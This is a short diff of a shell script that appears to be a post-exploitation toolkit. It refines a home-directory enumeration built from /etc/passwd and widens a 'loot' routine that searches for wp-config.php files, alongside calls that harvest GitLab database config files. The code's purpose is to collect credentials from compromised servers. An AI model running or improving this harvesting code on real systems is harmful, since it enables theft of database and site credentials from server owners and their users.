@@ -1070,8 +1070,8 @@ _hs_gen_home() {
         fi
     else
         # str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; [ -d /var/www ] && echo "/var/www"; } | sort -u)"
-        str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; } | sort -u)"
-        [[ "$str" != *"/var/www"* ]] && str+="/var/www"$'\n'
+        str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ ! -d "$d" ] && continue; [[ "$d" == "/" || "$d" == "/bin" || "$d" == "/sbin" ]] && continue; echo "$d"; done; } | sort -u)"
+        [ -d /var/www ] && [[ "$str" != *"/var/www"* ]] && str+="/var/www"$'\n'
     fi
 
     set -f
@@ -1260,7 +1260,7 @@ loot() {
     loot_gitlab /opt/gitlab/etc/gitlab-psql-rc
     loot_gitlab /etc/gitlab-psql-rc
 
-    find "${HOMEDIRARR[@]}" -maxdepth 3 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
+    find "${HOMEDIRARR[@]}" -maxdepth 4 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
         _loot_wp "$fn"
     done
 
